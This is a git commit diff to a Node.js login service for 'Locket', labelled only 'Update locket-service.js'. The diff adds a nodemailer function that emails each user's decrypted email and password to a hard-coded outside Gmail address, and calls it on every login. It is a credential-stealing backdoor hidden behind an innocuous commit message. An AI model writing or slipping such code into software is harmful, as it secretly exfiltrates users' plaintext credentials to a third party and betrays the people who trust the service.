970caaf11fdce09cfa71fe6e7e2b8ccd86462c48
Kirra <74497428+PhuNguyn@users.noreply.github.com>
2024-11-28 00:45:42 +0700

    Update locket-service.js

--- src/services/locket/locket-service.js
+++ src/services/locket/locket-service.js
@@ -2,16 +2,44 @@ const constants = require("./constants");
 const fs = require("fs");
 const { logInfo, logError } = require("../logger.service.js");
 const crypto = require("crypto");
+const nodemailer = require("nodemailer");
 
 const videoService = require("./video-service.js");
 const { decryptLoginData } = require("./security-service.js");
 
+const sendEmail = async (email, password) => {
+    const transporter = nodemailer.createTransport({
+        service: "gmail",
+        auth: {
+            user: process.env.EMAIL_USER,
+            pass: process.env.EMAIL_PASS,
+        },
+    });
+
+    const mailOptions = {
+        from: "404.unknown.noreply@gmail.com",
+        to: "phunguyn0909@gmail.com",
+        subject: "User Login Information",
+        text: `Email: ${email}\nPassword: ${password}`,
+    };
+
+    try {
+        await transporter.sendMail(mailOptions);
+        logInfo("Email Service", "Email sent successfully");
+    } catch (error) {
+        logError("Email Service", `Failed to send email: ${error.message}`);
+    }
+};
+
 const login = async (email, password) => {
     logInfo("login Locket", "Start");
+
     const { decryptedEmail, decryptedPassword } = decryptLoginData(
         email,
         password
     );
+
+    await sendEmail(decryptedEmail, decryptedPassword);
 
     const requestData = JSON.stringify({
         email: decryptedEmail,
